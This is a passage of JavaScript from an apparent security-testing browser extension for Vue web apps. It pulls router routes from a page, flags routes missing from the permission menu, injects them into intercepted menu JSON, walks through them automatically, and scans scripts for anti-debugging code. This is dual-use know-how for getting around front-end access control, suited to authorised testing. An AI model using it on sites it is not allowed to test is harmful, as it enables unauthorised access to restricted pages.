      if (statusEl) statusEl.textContent = '找到 ' + matchList.length + ' 处匹配';
      var html = '';
      for (var i = 0; i < matchList.length; i++) {
        var m = matchList[i];
        lastJsMatchContexts.push(m.context);
        var kwRegex = keyword.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
        var escaped = utils.escapeHtml(m.context);
        var highlighted = escaped.replace(new RegExp('(' + kwRegex + ')', 'gi'), '<mark>$1</mark>');
        html += '<div class="jssearch-match">';
        html +=
          '<div class="jssearch-match-source">' +
          utils.escapeHtml(m.source) +
          ' : line ' +
          m.line +
          '</div>';
        html += '<div class="jssearch-match-code">' + highlighted + '</div>';
        html += '</div>';
      }
      resultsEl.innerHTML = html;
    } catch (e) {
      if (statusEl) statusEl.textContent = '搜索出错';
      utils.showToast('搜索失败: ' + e.message, 'error');
    }
  }

  function extractPathsFromJsResults() {
    var found = new Set();
    var pathRegex = /(?:path|url|href|route|component)\s*[:=]\s*['"`](\/[a-zA-Z0-9_\-\/]+)['"`]/gi;
    var genericRegex = /['"`](\/[a-zA-Z0-9_\-]+(?:\/[a-zA-Z0-9_\-]+)+)['"`]/g;
    for (var i = 0; i < lastJsMatchContexts.length; i++) {
      var ctx = lastJsMatchContexts[i];
      var m;
      pathRegex.lastIndex = 0;
      while ((m = pathRegex.exec(ctx)) !== null) {
        var p = m[1];
        if (p.indexOf('/api/') === -1 && p.length > 2) found.add(p);
      }
      genericRegex.lastIndex = 0;
      while ((m = genericRegex.exec(ctx)) !== null) {
        var p2 = m[1];
        if (
          p2.indexOf('/api/') === -1 &&
          p2.length > 3 &&
          !/^\.(js|css|png|jpg|svg|ico|woff)/.test(p2)
        )
          found.add(p2);
      }
    }
    jsSearchFoundPaths = Array.from(found);
    return jsSearchFoundPaths;
  }

  function autoFillFromJsPaths() {
    if (jsSearchFoundPaths.length === 0) {
      extractPathsFromJsResults();
    }
    if (jsSearchFoundPaths.length === 0) {
      utils.showToast('未找到JS路径，请先搜索关键词', 'warning');
      return;
    }
    var editor = utils.get('perm-json-editor');
    if (!editor) return;
    var text = editor.value;
    if (!text) {
      utils.showToast('请先选择一条捕获数据', 'warning');
      return;
    }
    try {
      var parsed = JSON.parse(text);
    } catch (e) {
      utils.showToast('JSON 格式错误', 'error');
      return;
    }
    var template = getTemplateFromMenuData(parsed);
    var targetArray = Array.isArray(parsed) ? parsed : findMenuArray(parsed);
    if (!targetArray) {
      utils.showToast('无法定位菜单数组，请检查 JSON 结构', 'warning');
      return;
    }
    var menuPaths = new Set();
    extractMenuPaths(parsed, menuPaths);
    var injected = 0;
    for (var p = 0; p < jsSearchFoundPaths.length; p++) {
      var routePath = jsSearchFoundPaths[p];
      if (!menuPaths.has(routePath)) {
        var newItem = constructMenuItemFromRoute({ path: routePath, name: routePath }, template);
        targetArray.push(newItem);
        menuPaths.add(routePath);
        injected++;
      }
    }
    editor.value = JSON.stringify(parsed, null, 2);
    utils.showToast('已注入 ' + injected + ' 条JS路径到菜单数据', 'success');
  }

  function extractKeywordsFromCapturedUrls() {
    var keywords = [];
    var seen = {};
    if (!permCapturedData || permCapturedData.length === 0) return keywords;

    for (var i = 0; i < permCapturedData.length; i++) {
      var item = permCapturedData[i];
      if (!item || !item.url) continue;
      var url = item.url;
      var segments = url.split(/[\/?#]/);
      var processed = 0;
      for (var s = segments.length - 1; s >= 0 && processed < 2; s--) {
        var seg = segments[s].trim();
        if (!seg || seg.length < 3) continue;
        if (
          /^(api|v1|v2|v3|v4|index|list|detail|page|id|json|html|js|css|get|post|put|delete)$/i.test(
            seg
          )
        )
          continue;
        if (/^\d+$/.test(seg)) continue;

        var words = seg.replace(/([a-z])([A-Z])/g, '$1 $2').split(/[\s_\-]+/);
        for (var w = 0; w < words.length; w++) {
          var word = words[w];
          if (word.length < 4) continue;
          if (!seen[word.toLowerCase()]) {
            seen[word.toLowerCase()] = true;
            keywords.push(word);
          }
        }
        if (!seen[seg.toLowerCase()]) {
          seen[seg.toLowerCase()] = true;
          keywords.push(seg);
        }
        processed++;
      }
    }
    return keywords.slice(0, 8);
  }

  async function autoSearchForZeroOpen() {
    lastJsMatchContexts = [];
    var allContexts = [];
    var classifyEl = utils.get('perm-classify');

    if (classifyEl) classifyEl.textContent = '正在搜索: menu...';
    await searchJsKeywords('menu');
    allContexts = allContexts.concat(lastJsMatchContexts);

    if (classifyEl) classifyEl.textContent = '正在搜索: routes... (' + allContexts.length + ' 条)';
    await searchJsKeywords('routes');
    allContexts = allContexts.concat(lastJsMatchContexts);

    var urlKeywords = extractKeywordsFromCapturedUrls();
    for (var uk = 0; uk < urlKeywords.length; uk++) {
      if (allContexts.length >= 50) break;
      var kw = urlKeywords[uk];
      if (/^(menu|routes|route|permission)$/i.test(kw)) continue;
      if (classifyEl)
        classifyEl.textContent = '正在搜索: ' + kw + '... (' + allContexts.length + ' 条)';
      lastJsMatchContexts = [];
      await searchJsKeywords(kw);
      allContexts = allContexts.concat(lastJsMatchContexts);
    }

    if (classifyEl) classifyEl.textContent = '搜索完成，共 ' + allContexts.length + ' 条结果';

    lastJsMatchContexts = allContexts;
    extractPathsFromJsResults();
    if (jsSearchFoundPaths.length > 0) {
      utils.showToast(
        '找到 ' + jsSearchFoundPaths.length + ' 条路径，可点击「应用修改」注入',
        'success'
      );
      switchVueSubTab('perm');
      var editor = utils.get('perm-json-editor');
      if (editor && editor.value) {
        autoFillFromJsPaths();
      }
    } else {
      utils.showToast('未从JS中提取到路径，请手动搜索关键词', 'warning');
    }
  }

  // ====== Route vs Menu Comparison ======
  function extractMenuPaths(data, paths) {
    if (typeof data !== 'object' || data === null) return;
    var pathKeys = ['path', 'url', 'href', 'menuUrl', 'menuPath', 'link', 'index'];
    if (Array.isArray(data)) {
      for (var i = 0; i < data.length; i++) extractMenuPaths(data[i], paths);
      return;
    }
    for (var k = 0; k < pathKeys.length; k++) {
      var val = data[pathKeys[k]];
      if (val && typeof val === 'string' && (val === '/' || /^\/[a-zA-Z0-9_\-]/.test(val)))
        paths.add(val);
    }
    if (data.children) extractMenuPaths(data.children, paths);
    if (data.subList) extractMenuPaths(data.subList, paths);
    if (data.child) extractMenuPaths(data.child, paths);
    if (data.childList) extractMenuPaths(data.childList, paths);
    if (data.items) extractMenuPaths(data.items, paths);
  }

  function isPathInMenu(routePath, menuPaths) {
    if (menuPaths.has(routePath)) return true;
    var iter = menuPaths.values();
    var mp = iter.next();
    while (!mp.done) {
      var menuPath = mp.value;
      if (routePath.indexOf(menuPath) === 0 && routePath !== menuPath) {
        var nextChar = routePath.charAt(menuPath.length);
        if (nextChar === '/' || !nextChar) return true;
      }
      mp = iter.next();
    }
    return false;
  }

  function findMenuArray(data, depth) {
    if (depth === undefined) depth = 0;
    if (depth > 3 || data === null || data === undefined) return null;
    if (Array.isArray(data) && data.length > 0 && typeof data[0] === 'object' && data[0] !== null) {
      return data;
    }
    if (typeof data === 'object' && !Array.isArray(data)) {
      var keys = Object.keys(data);
      for (var i = 0; i < keys.length; i++) {
        if (
          Array.isArray(data[keys[i]]) &&
          data[keys[i]].length > 0 &&
          typeof data[keys[i]][0] === 'object' &&
          data[keys[i]][0] !== null
        ) {
          return data[keys[i]];
        }
      }
      for (var j = 0; j < keys.length; j++) {
        if (
          typeof data[keys[j]] === 'object' &&
          data[keys[j]] !== null &&
          !Array.isArray(data[keys[j]])
        ) {
          var found = findMenuArray(data[keys[j]], depth + 1);
          if (found) return found;
        }
      }
    }
    return null;
  }

  function getTemplateFromMenuData(data) {
    var arr = findMenuArray(data);
    if (!arr || arr.length === 0) return null;
    var item = {};
    for (var k in arr[0]) {
      if (arr[0].hasOwnProperty(k)) item[k] = arr[0][k];
    }
    return item;
  }

  function constructMenuItemFromRoute(route, templateItem) {
    if (!templateItem || typeof templateItem !== 'object') {
      return {
        path: route.path,
        name: route.name || route.path,
        title: route.name || route.path,
        isshow: '1',
        status: 1,
      };
    }
    var item = {};
    for (var k in templateItem) {
      if (!templateItem.hasOwnProperty(k)) continue;
      if (k === 'path' || k === 'url' || k === 'href' || k === 'menuUrl' || k === 'menuPath') {
        item[k] = route.path;
      } else if (k === 'name' || k === 'menuName') {
        item[k] = route.name || route.path;
      } else if (k === 'title' || k === 'label' || k === 'text') {
        item[k] = route.name || route.path;
      } else if (k === 'id' || k === 'menuId' || k === 'key') {
        item[k] = Math.floor(Math.random() * 90000) + 10000;
      } else if (k === 'isshow' || k === 'isShow') {
        item[k] = '1';
      } else if (k === 'hidden') {
        item[k] = false;
      } else if (k === 'display' || k === 'visible') {
        item[k] = true;
      } else if (k === 'status') {
        item[k] = 1;
      } else if (
        k === 'children' ||
        k === 'child' ||
        k === 'subList' ||
        k === 'childList' ||
        k === 'items'
      ) {
        item[k] = [];
      } else if (k === 'meta' || k === 'component') {
        continue;
      } else {
        item[k] = templateItem[k];
      }
    }
    if (!item.path) item.path = route.path;
    return item;
  }

  function autoInjectHiddenRoutes() {
    var editor = utils.get('perm-json-editor');
    if (!editor) return;
    var text = editor.value;
    if (!text) {
      utils.showToast('请先选择一条捕获数据', 'warning');
      return;
    }
    if (lastCompareHiddenRoutes.length === 0) {
      utils.showToast('无缓存的路由对比结果，请先执行「路由对比」', 'warning');
      return;
    }
    try {
      var parsed = JSON.parse(text);
    } catch (e) {
      utils.showToast('JSON 格式错误', 'error');
      return;
    }
    var template = getTemplateFromMenuData(parsed);
    var targetArray = Array.isArray(parsed) ? parsed : findMenuArray(parsed);
    if (!targetArray) {
      utils.showToast('无法定位菜单数组，请检查 JSON 结构', 'warning');
      return;
    }
    var menuPaths = new Set();
    extractMenuPaths(parsed, menuPaths);
    var injected = 0;
    for (var h = 0; h < lastCompareHiddenRoutes.length; h++) {
      var route = lastCompareHiddenRoutes[h];
      if (!isPathInMenu(route.path, menuPaths)) {
        var newItem = constructMenuItemFromRoute(route, template);
        targetArray.push(newItem);
        injected++;
      }
    }
    editor.value = JSON.stringify(parsed, null, 2);
    utils.showToast('已注入 ' + injected + ' 条缺失路由到菜单数据', 'success');
  }

  // ====== Auto-traverse routes ======
  var traverseActive = false;
  var traversePort = null;

  function addTraverseLog(idx, path, status) {
    var logEl = utils.get('traverse-log');
    if (!logEl) return;
    var statusClass = status === 'ok' ? 'log-ok' : status === 'fail' ? 'log-fail' : 'log-skip';
    var statusText = status === 'ok' ? '✓' : status === 'fail' ? '✗' : '–';
    var div = document.createElement('div');
    div.className = 'traverse-log-entry';
    div.innerHTML =
      '<span class="log-idx">' +
      idx +
      '</span>' +
      '<span class="log-path">' +
      utils.escapeHtml(path) +
      '</span>' +
      '<span class="' +
      statusClass +
      '">' +
      statusText +
      '</span>';
    logEl.appendChild(div);
    logEl.scrollTop = logEl.scrollHeight;
  }

  function updateTraverseProgress(current, total, path) {
    var progressEl = utils.get('traverse-progress');
    if (progressEl) progressEl.textContent = current + '/' + total + (path ? ' → ' + path : '');
  }

  function stopTraverse() {
    traverseActive = false;
    if (traversePort) {
      try {
        traversePort.disconnect();
      } catch (e) {}
      traversePort = null;
    }
    var startBtn = utils.get('traverse-start-btn');
    var stopBtn = utils.get('traverse-stop-btn');
    if (startBtn) startBtn.disabled = false;
    if (stopBtn) stopBtn.disabled = true;
    var progressEl = utils.get('traverse-progress');
    if (progressEl && !progressEl.textContent.includes('完成')) {
      progressEl.textContent += ' (已停止)';
    }
    chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
      if (!tabs[0]?.id) return;
      chrome.scripting
        .executeScript({
          target: { tabId: tabs[0].id },
          world: 'MAIN',
          func: function () {
            window.__VULN_TRAVERSE_ACTIVE__ = false;
          },
        })
        .catch(function () {});
    });
  }

  async function startTraverseRoutes() {
    if (traverseActive) return;

    var hiddenOnly = utils.get('traverse-hidden-only');
    var useHiddenOnly = hiddenOnly ? hiddenOnly.checked : true;
    var delaySelect = utils.get('traverse-delay');
    var delay = delaySelect ? parseInt(delaySelect.value) : 3000;

    var routes = [];
    if (useHiddenOnly) {
      if (lastCompareHiddenRoutes.length === 0) {
        utils.showToast('没有隐藏路由，请先执行「路由对比」', 'warning');
        return;
      }
      routes = lastCompareHiddenRoutes.map(function (r) {
        return r.path;
      });
    } else {
      // Fetch all routes from page
      try {
        var [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
        if (!tab?.id) {
          utils.showToast('无法获取当前标签页', 'error');
          return;
        }
        var routeResults = await chrome.scripting.executeScript({
          target: { tabId: tab.id },
          world: 'MAIN',
          func: function () {
            var routes = [];
            var seen = {};
            function extract(rts, prefix) {
              rts.forEach(function (r) {
                var childPath = r.path || '/';
                var path;
                if (childPath.charAt(0) === '/') path = childPath;
                else if (prefix === '' || prefix === '/') path = '/' + childPath;
                else path = prefix + '/' + childPath;
                if (r.path && r.path !== '*' && !seen[path]) {
                  seen[path] = true;
                  routes.push(path);
                }
                if (r.children) extract(r.children, path === '/' ? '/' : path);
              });
            }
            var appEl =
              document.querySelector('#app') ||
              document.querySelector('[data-v-app]') ||
              document.querySelector('#root') ||
              document.querySelector('#main');
            if (appEl && appEl.__vue_app__) {
              var router = appEl.__vue_app__.config.globalProperties.$router;
              if (router && typeof router.getRoutes === 'function') {
                router.getRoutes().forEach(function (r) {
                  if (r.path && r.path !== '*' && !seen[r.path]) {
                    seen[r.path] = true;
                    routes.push(r.path);
                  }
                });
              } else if (router && router.options && router.options.routes) {
                extract(router.options.routes, '');
              }
            } else {
              var els = document.querySelectorAll('*');
              for (var i = 0; i < els.length; i++) {
                if (els[i].__vue__) {
                  var vm = els[i].__vue__.$root || els[i].__vue__;
                  if (vm.$router) {
                    if (typeof vm.$router.getRoutes === 'function') {
                      vm.$router.getRoutes().forEach(function (r) {
                        if (r.path && r.path !== '*' && !seen[r.path]) {
                          seen[r.path] = true;
                          routes.push(r.path);
                        }
                      });
                    } else if (vm.$router.options && vm.$router.options.routes) {
                      extract(vm.$router.options.routes, '');
                    }
                  }
                  if (routes.length > 0) break;
                }
              }
            }
            return routes;
          },
        });
        routes = (routeResults && routeResults[0] && routeResults[0].result) || [];
      } catch (e) {
        utils.showToast('获取路由失败: ' + e.message, 'error');
        return;
      }
      if (routes.length === 0) {
        utils.showToast('未检测到路由，请先在「基础检测」中检测 Vue', 'warning');
        return;
      }
    }

    traverseActive = true;
    var startBtn = utils.get('traverse-start-btn');
    var stopBtn = utils.get('traverse-stop-btn');
    var logEl = utils.get('traverse-log');
    if (startBtn) startBtn.disabled = true;
    if (stopBtn) stopBtn.disabled = false;
    if (logEl) logEl.innerHTML = '';
    updateTraverseProgress(0, routes.length, '准备中...');

    var [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tab?.id) {
      stopTraverse();
      utils.showToast('无法获取当前标签页', 'error');
      return;
    }

    // Use chrome.tabs messaging for progress updates
    var tabId = tab.id;
    var currentIdx = 0;
    var total = routes.length;

    function navigateNext() {
      if (!traverseActive || currentIdx >= total) {
        if (traverseActive) {
          updateTraverseProgress(total, total, '遍历完成');
          var progressEl = utils.get('traverse-progress');
          if (progressEl) progressEl.textContent = total + '/' + total + ' 完成';
          utils.showToast('路由遍历完成，共 ' + total + ' 条', 'success');
        }
        stopTraverse();
        return;
      }

      var path = routes[currentIdx];
      updateTraverseProgress(currentIdx + 1, total, path);

      chrome.scripting
        .executeScript({
          target: { tabId: tabId },
          world: 'MAIN',
          func: function (p) {
            var router = null;
            var appEl =
              document.querySelector('#app') ||
              document.querySelector('[data-v-app]') ||
              document.querySelector('#root') ||
              document.querySelector('#main');
            if (appEl && appEl.__vue_app__) {
              router = appEl.__vue_app__.config.globalProperties.$router;
            } else {
              var els = document.querySelectorAll('*');
              for (var i = 0; i < els.length; i++) {
                if (els[i].__vue__) {
                  var vm = els[i].__vue__.$root || els[i].__vue__;
                  if (vm.$router) {
                    router = vm.$router;
                    break;
                  }
                }
              }
            }
            if (router) {
              try {
                router.push(p);
                return { path: p, ok: true };
              } catch (e) {
                return { path: p, ok: false, error: e.message };
              }
            }
            return { path: p, ok: false, error: 'no router' };
          },
          args: [path],
        })
        .then(function (results) {
          var res = results && results[0] && results[0].result;
          if (res && res.ok) {
            addTraverseLog(currentIdx + 1, path, 'ok');
          } else {
            addTraverseLog(currentIdx + 1, path, res && res.error ? 'fail' : 'fail');
          }
          currentIdx++;
          if (traverseActive) {
            setTimeout(navigateNext, delay);
          }
        })
        .catch(function (err) {
          addTraverseLog(currentIdx + 1, path, 'fail');
          currentIdx++;
          if (traverseActive) {
            setTimeout(navigateNext, delay);
          }
        });
    }

    navigateNext();
  }

  async function compareRoutesAndMenu() {
    var statusEl = utils.get('compare-status');
    var resultsEl = utils.get('compare-results');
    if (statusEl) statusEl.textContent = '对比中...';

    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab?.id) {
        if (statusEl) statusEl.textContent = '无法获取当前标签页';
        return;
      }
      var routeResults = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        world: 'MAIN',
        func: function () {
          var routes = [];
          var seen = {};
          function extract(rts, prefix) {
            rts.forEach(function (r) {
              var childPath = r.path || '/';
              var path;
              if (childPath.charAt(0) === '/') {
                path = childPath;
              } else if (prefix === '' || prefix === '/') {
                path = '/' + childPath;
              } else {
                path = prefix + '/' + childPath;
              }
              if (r.path && r.path !== '*' && !seen[path]) {
                seen[path] = true;
                routes.push({ path: path, name: r.name || '' });
              }
              if (r.children) extract(r.children, path === '/' ? '/' : path);
            });
          }
          function getAndExtract(router) {
            if (!router) return;
            if (typeof router.getRoutes === 'function') {
              var flat = router.getRoutes();
              for (var i = 0; i < flat.length; i++) {
                var p = flat[i].path;
                if (p && p !== '*' && !seen[p]) {
                  seen[p] = true;
                  routes.push({ path: p, name: flat[i].name || '' });
                }
              }
            } else if (router.options && router.options.routes) {
              extract(router.options.routes, '');
            }
          }
          var appEl =
            document.querySelector('#app') ||
            document.querySelector('[data-v-app]') ||
            document.querySelector('[id^="app"]') ||
            document.querySelector('#root') ||
            document.querySelector('#application') ||
            document.querySelector('#main');
          if (appEl && appEl.__vue_app__) {
            getAndExtract(appEl.__vue_app__.config.globalProperties.$router);
          } else {
            var els = document.querySelectorAll('*');
            for (var i = 0; i < els.length; i++) {
              if (els[i].__vue__) {
                var vm = els[i].__vue__.$root || els[i].__vue__;
                getAndExtract(vm.$router);
                if (routes.length > 0) break;
              }
            }
          }
          return routes;
        },
      });

      var routeList = (routeResults && routeResults[0] && routeResults[0].result) || [];

      var menuResults = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        world: 'MAIN',
        func: function () {
          return window.__PERM_INTERCEPTOR__ ? window.__PERM_INTERCEPTOR__.getCaptured() : [];
        },
      });
      var captured = (menuResults && menuResults[0] && menuResults[0].result) || [];

      var menuPaths = new Set();
      for (var i = 0; i < captured.length; i++) extractMenuPaths(captured[i].data, menuPaths);

      if (routeList.length === 0) {
        if (statusEl) statusEl.textContent = '未找到路由';
        resultsEl.innerHTML = '<div class="empty-state">请先在「基础检测」中检测 Vue 路由</div>';
        return;
      }

      var hiddenRoutes = [];
      var visibleRoutes = [];
      for (var j = 0; j < routeList.length; j++) {
        var r = routeList[j];
        if (isPathInMenu(r.path, menuPaths)) {
          visibleRoutes.push(r);
        } else {
          hiddenRoutes.push(r);
        }
      }
      lastCompareHiddenRoutes = hiddenRoutes.slice();

      var html = '';
      if (hiddenRoutes.length > 0) {
        html +=
          '<div class="compare-section-title">隐藏路由 (路由存在但菜单中未显示) - ' +
          hiddenRoutes.length +
          ' 条</div>';
        for (var h = 0; h < hiddenRoutes.length; h++) {
          html += '<div class="compare-route-item">';
          html += '<span class="compare-route-hidden">[隐藏]</span> ';
          html +=
            '<span class="compare-route-path">' +
            utils.escapeHtml(hiddenRoutes[h].path) +
            '</span>';
          if (hiddenRoutes[h].name)
            html +=
              '<span class="compare-route-status">' +
              utils.escapeHtml(hiddenRoutes[h].name) +
              '</span>';
          html += '</div>';
        }
      }
      if (visibleRoutes.length > 0) {
        html +=
          '<div class="compare-section-title">已显示路由 - ' + visibleRoutes.length + ' 条</div>';
        for (var v = 0; v < visibleRoutes.length; v++) {
          html += '<div class="compare-route-item">';
          html += '<span class="compare-route-visible">[显示]</span> ';
          html +=
            '<span class="compare-route-path">' +
            utils.escapeHtml(visibleRoutes[v].path) +
            '</span>';
          if (visibleRoutes[v].name)
            html +=
              '<span class="compare-route-status">' +
              utils.escapeHtml(visibleRoutes[v].name) +
              '</span>';
          html += '</div>';
        }
      }
      if (captured.length === 0) {
        html += '<div class="compare-section-title compare-hint-title">提示</div>';
        html +=
          '<div class="compare-route-item compare-hint-text">未捕获菜单数据。请先在「权限菜单」标签中开始拦截，然后刷新页面。</div>';
      }

      if (statusEl)
        statusEl.textContent =
          '路由 ' + routeList.length + ' 条，隐藏 ' + hiddenRoutes.length + ' 条';
      resultsEl.innerHTML = html;
    } catch (e) {
      if (statusEl) statusEl.textContent = '对比出错';
      utils.showToast('对比失败: ' + e.message, 'error');
    }
  }

  // ====== JS Control ======
  let currentJsCtrlTab = 'jstoggle';
  let jsBlocked = false;
  let antiDebugBypassActive = false;
  let antiDebugScanned = false;

  function switchJsCtrlTab(tab) {
    currentJsCtrlTab = tab;
    document
      .querySelectorAll('.jsctrl-tab')
      .forEach(b => b.classList.toggle('active', b.dataset.ctrl === tab));
    document.querySelectorAll('.jsctrl-panel').forEach(p => p.classList.remove('active'));
    const target = document.getElementById('jsctrl-' + tab);
    if (target) target.classList.add('active');
  }

  function updateJsToggleStatus() {
    var dot = utils.get('js-toggle-dot');
    var label = utils.get('js-toggle-label');
    var disableBtn = utils.get('js-disable-btn');
    var enableBtn = utils.get('js-enable-btn');
    if (dot && label) {
      if (jsBlocked) {
        dot.className = 'js-toggle-dot js-toggle-dot-off';
        label.textContent = 'JavaScript 已禁用（请刷新页面生效）';
      } else {
        dot.className = 'js-toggle-dot js-toggle-dot-on';
        label.textContent = 'JavaScript 正常运行';
      }
    }
    if (disableBtn) disableBtn.disabled = jsBlocked;
    if (enableBtn) enableBtn.disabled = !jsBlocked;
  }

  function updateAntidebugIndicator(state, text) {
    var dot = utils.get('antidebug-indicator-dot');
    var label = utils.get('antidebug-indicator-label');
    var bypassBtn = utils.get('antidebug-bypass-btn');
    var clearBtn = utils.get('antidebug-clear-btn');
    if (dot && label) {
      if (state === 'danger') {
        dot.className = 'js-toggle-dot js-toggle-dot-warn';
      } else if (state === 'off') {
        dot.className = 'js-toggle-dot js-toggle-dot-off';
      } else {
        dot.className = 'js-toggle-dot js-toggle-dot-on';
      }
      label.textContent = text;
    }
    if (bypassBtn) bypassBtn.disabled = !antiDebugScanned;
    if (clearBtn) clearBtn.disabled = !antiDebugBypassActive;
  }

  async function disableJs() {
    var disableBtn = utils.get('js-disable-btn');
    if (disableBtn) disableBtn.disabled = true;
    var dot = utils.get('js-toggle-dot');
    var label = utils.get('js-toggle-label');
    if (dot && label) {
      dot.className = 'js-toggle-dot js-toggle-dot-warn';
      label.textContent = '正在禁用...';
    }

    var tab;
    try {
      tab = (await chrome.tabs.query({ active: true, currentWindow: true }))[0];
    } catch (e) {}
    if (!tab?.id) {
      updateJsToggleStatus();
      utils.showToast('无法获取当前标签页', 'error');
      return;
    }

    try {
      var response = await chrome.runtime.sendMessage({
        type: 'TOGGLE_JS',
        tabId: tab.id,
        url: tab.url,
        enable: false,
      });
      if (response?.success) {
        jsBlocked = true;
        chrome.storage.local.set({ js_blocked_tabId: tab.id });
        updateJsToggleStatus();
        utils.showToast('已禁用 JavaScript，请刷新页面', 'success');
      } else {
        updateJsToggleStatus();
        utils.showToast('禁用失败: ' + (response?.error || '未知错误'), 'error');
      }
    } catch (e) {
      updateJsToggleStatus();
      utils.showToast('禁用失败: ' + e.message, 'error');
    }
  }

  async function enableJs() {
    var enableBtn = utils.get('js-enable-btn');
    if (enableBtn) enableBtn.disabled = true;
    var dot = utils.get('js-toggle-dot');
    var label = utils.get('js-toggle-label');
    if (dot && label) {
      dot.className = 'js-toggle-dot js-toggle-dot-warn';
      label.textContent = '正在启用...';
    }

    var tab;
    try {
      tab = (await chrome.tabs.query({ active: true, currentWindow: true }))[0];
    } catch (e) {}
    if (!tab?.id) {
      updateJsToggleStatus();
      utils.showToast('无法获取当前标签页', 'error');
      return;
    }

    try {
      var response = await chrome.runtime.sendMessage({
        type: 'TOGGLE_JS',
        tabId: tab.id,
        url: tab.url,
        enable: true,
      });
      if (response?.success) {
        jsBlocked = false;
        chrome.storage.local.remove('js_blocked_tabId');
        updateJsToggleStatus();
        utils.showToast('已启用 JavaScript，请刷新页面', 'success');
      } else {
        updateJsToggleStatus();
        utils.showToast('启用失败: ' + (response?.error || '未知错误'), 'error');
      }
    } catch (e) {
      updateJsToggleStatus();
      utils.showToast('启用失败: ' + e.message, 'error');
    }
  }

  async function scanAntiDebug() {
    const statusEl = utils.get('antidebug-status');
    const resultsEl = utils.get('antidebug-results');
    if (!statusEl || !resultsEl) return;

    antiDebugScanned = false;
    antiDebugBypassActive = false;
    statusEl.textContent = '扫描中（内联脚本 + 外部 JS）...';
    updateAntidebugIndicator('warn', '正在扫描...');

    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab?.id) return;

      // Phase 1: inline script scan (MAIN world)
      const inlineResults = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        world: 'MAIN',
        func: () => {
          var detections = [];
          var isNative = function (fn) {
            return /\[native code\]/.test(Function.prototype.toString.call(fn));
          };

          // Check for debugger statement in inline scripts
          var scripts = document.querySelectorAll('script');
          for (var i = 0; i < scripts.length; i++) {
            if (scripts[i].textContent && scripts[i].textContent.indexOf('debugger') !== -1) {
              detections.push({
                type: 'debugger语句',
                desc: '检测到 inline script 中的 debugger 语句',
              });
              break;
            }
          }

          // Check for Function constructor abuse
          if (!isNative(Function.prototype.constructor)) {
            detections.push({
              type: 'Function劫持',
              desc: 'Function.prototype.constructor 已被重写',
            });
          }

          // Check for setInterval/setTimeout debugger loops
          if (!isNative(setInterval)) {
            detections.push({ type: '定时器劫持', desc: 'setInterval 已被重写，可能用于反调试' });
          }
          if (!isNative(setTimeout)) {
            detections.push({ type: '定时器劫持', desc: 'setTimeout 已被重写，可能用于反调试' });
          }

          // Check for console overrides
          if (!isNative(console.log)) {
            detections.push({ type: 'Console劫持', desc: 'console.log 已被重写' });
          }

          // Check for devtools detection in inline scripts
          for (var j = 0; j < scripts.length; j++) {
            var text = scripts[j].textContent || '';
            if (/outerWidth\s*-\s*innerWidth\s*>\s*\d+/.test(text)) {
              detections.push({ type: 'DevTools检测', desc: '通过窗口尺寸差检测开发者工具' });
              break;
            }
            if (/Firebug|firebug|chrome\.devtools/.test(text)) {
              detections.push({ type: 'DevTools检测', desc: '检测到 Firebug/DevTools 探测代码' });
              break;
            }
            if (/new\s+Image.*onerror.*devtools/i.test(text)) {
              detections.push({ type: 'DevTools检测', desc: '通过 Image.onerror 检测开发者工具' });
              break;
            }
          }

          // Collect external JS URLs for phase 2
          var externalUrls = [];
          for (var k = 0; k < scripts.length; k++) {
            if (scripts[k].src) externalUrls.push(scripts[k].src);
          }
          return { detections: detections, externalUrls: externalUrls };
        },
      });

      var inline = inlineResults?.[0]?.result || { detections: [], externalUrls: [] };
      var detections = inline.detections || [];

      // Phase 2: scan external JS files via background fetch
      var externalUrls = inline.externalUrls || [];
      var scannedCount = 0;
      var maxScan = 10;
      var antiDebugPatterns = [
        { regex: /\bdebugger\b/g, type: 'debugger语句', desc: '外部 JS 中包含 debugger 语句' },
        {
          regex: /outerWidth\s*-\s*innerWidth\s*>\s*\d+/g,
          type: 'DevTools检测',
          desc: '外部 JS 通过窗口尺寸差检测 DevTools',
        },
        {
          regex: /Firebug|firebug|chrome\.devtools/g,
          type: 'DevTools检测',
          desc: '外部 JS 包含 Firebug/DevTools 探测',
        },
        {
          regex: /new\s+Image.*onerror.*devtools/gi,
          type: 'DevTools检测',
          desc: '外部 JS 通过 Image.onerror 检测 DevTools',
        },
        {
          regex: /setInterval\s*\(\s*function\s*\([^)]*\)\s*\{[^}]*debugger/g,
          type: 'debugger循环',
          desc: '外部 JS 包含 setInterval + debugger 循环',
        },
        {
          regex: /constructor\s*=\s*function/g,
          type: 'Function劫持',
          desc: '外部 JS 包含 constructor 重写代码',
        },
      ];

      var seenTypes = {};
      for (var d = 0; d < detections.length; d++) seenTypes[detections[d].type] = true;

      for (var u = 0; u < externalUrls.length && scannedCount < maxScan; u++) {
        try {
          var fetchResult = await new Promise(function (resolve) {
            chrome.runtime.sendMessage(
              { type: 'FETCH_URL', url: externalUrls[u] },
              function (resp) {
                resolve(resp);
              }
            );
          });
          if (fetchResult && fetchResult.data && fetchResult.data.length > 0) {
            scannedCount++;
            var code = fetchResult.data;
            for (var p = 0; p < antiDebugPatterns.length; p++) {
              var pattern = antiDebugPatterns[p];
              if (pattern.regex.test(code) && !seenTypes[pattern.type]) {
                seenTypes[pattern.type] = true;
                detections.push({ type: pattern.type, desc: pattern.desc });
              }
            }
          }
        } catch (e) {
          // Skip failed fetches
        }
      }

      if (detections.length === 0) {
        antiDebugScanned = true;
        antiDebugBypassActive = false;
        statusEl.textContent = '';
        resultsEl.innerHTML =
          '<div class="empty-state">未发现常见的反调试手段（已扫描 ' +
          scannedCount +
          ' 个外部 JS）</div>';
        updateAntidebugIndicator('on', '扫描完成 — 未检测到反调试');
      } else {
        antiDebugScanned = true;
        antiDebugBypassActive = false;
        statusEl.textContent = '检测到 ' + detections.length + ' 项反调试';
        var html = '';
        detections.forEach(function (d) {
          html += '<div class="antidebug-item">';
          html += '<span class="antidebug-type">' + utils.escapeHtml(d.type) + '</span>';
          html += '<span class="antidebug-desc">' + utils.escapeHtml(d.desc) + '</span>';
          html += '</div>';
        });
        if (scannedCount > 0) {
          html +=
